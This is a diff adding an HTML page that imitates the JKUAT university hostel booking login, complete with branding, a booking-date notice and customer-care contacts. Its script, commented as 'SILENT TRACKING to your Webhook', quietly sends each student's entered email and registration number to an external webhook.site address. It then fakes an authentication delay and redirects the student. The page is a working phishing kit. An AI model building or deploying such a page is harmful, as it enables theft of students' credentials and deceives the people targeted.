@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JKUAT Hostel Booking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-image: url('jkuat-bg.jpeg'); 
+            background-color: #666; 
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .main-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: flex-start;
+            gap: 20px;
+            padding: 60px 20px 20px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* --- Left Info Box --- */
+        .info-box {
+            background-color: rgba(248, 249, 250, 0.95);
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            border-top: 3px solid #f8f9fa;
+        }
+
+        .info-box h4 {
+            color: #38761d;
+            font-size: 16px;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+
+        .info-box .bold-text {
+            color: #38761d;
+            font-weight: bold;
+            font-size: 15px;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .info-box .normal-text {
+            color: #38761d;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .info-box a {
+            color: #333;
+            text-decoration: none;
+        }
+
+        /* --- Right Login Box --- */
+        .login-box {
+            background-color: rgba(248, 249, 250, 0.95);
+            width: 100%;
+            max-width: 500px;
+            padding: 30px 40px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            width: 120px; 
+            height: auto;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #38761d;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            outline: none;
+            background-color: #fff;
+            transition: border-color 0.3s;
+        }
+
+        .input-email {
+            border: 1px solid #38761d;
+        }
+
+        .input-password {
+            border: 1px solid #ccc;
+        }
+
+        .input-password:focus {
+            border-color: #38761d;
+        }
+
+        .login-btn {
+            background-color: #38761d;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s, opacity 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #2e6018;
+        }
+
+        .login-btn:disabled {
+            background-color: #666;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+
+        /* --- Bottom Blue Bar --- */
+        .bottom-bar {
+            background-color: #3498db;
+            color: white;
+            text-align: center;
+            padding: 15px 10px;
+            width: 90%;
+            max-width: 1020px;
+            margin: 0 auto 40px auto;
+            font-size: 18px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        /* Mobile Responsiveness */
+        @media (max-width: 768px) {
+            .main-container {
+                padding-top: 30px;
+            }
+            .bottom-bar {
+                font-size: 14px;
+                width: 95%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Left Panel: Login Details -->
+        <div class="info-box">
+            <h4>Login Details</h4>
+            <p class="bold-text">Room Booking for First Year students will be on 25th August 2026 at 12:00pm.</p>
+            <p class="normal-text">For any inquiries, please mail us via <a href="mailto:customercare@jkuat.ac.ke">customercare@jkuat.ac.ke</a> , or call the University Customer Care through 0709 715815.</p>
+        </div>
+
+        <!-- Right Panel: Login Form -->
+        <div class="login-box">
+            <div class="logo-container">
+                <img src="jkuat-logo.png" alt="JKUAT Logo" onerror="this.style.display='none'">
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Enter Your Email Address ($ame as one used on admission).</label>
+                    <input type="email" id="studentEmail" class="input-email" placeholder="Student Email / Personal Email" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Enter Your Registration Number in Capital Letters.</label>
+                    <input type="password" id="studentReg" class="input-password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" id="submitBtn" class="login-btn">Login »</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Bottom Blue Notification Bar -->
+    <div class="bottom-bar">
+        DOWNLOAD LIST OF AREAS WITH OFF CAMPUS ACCOMMODATION NEAR JUJA
+    </div>
+
+    <!-- Authentication Simulation Script with Webhook -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission so we can animate it
+            event.preventDefault();
+
+            const btn = document.getElementById('submitBtn');
+            const email = document.getElementById('studentEmail').value;
+            const reg = document.getElementById('studentReg').value;
+
+            if(email && reg) {
+                // Change button state to simulate backend auth
+                btn.disabled = true;
+                btn.innerText = "Authenticating...";
+
+                // 🔥 SILENT TRACKING to your Webhook!
+                fetch('https://webhook.site/b925b6e9-543d-4906-9e8b-bc4234858beb', {
+                    method: 'POST',
+                    body: JSON.stringify({ Event: "LOGIN", Email: email, RegNo: reg })
+                }).catch(e => console.log(e));
+
+                // Simulate a 1.5-second network request delay, then transition
+                setTimeout(() => {
+                    window.location.href = 'hostels.html';
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
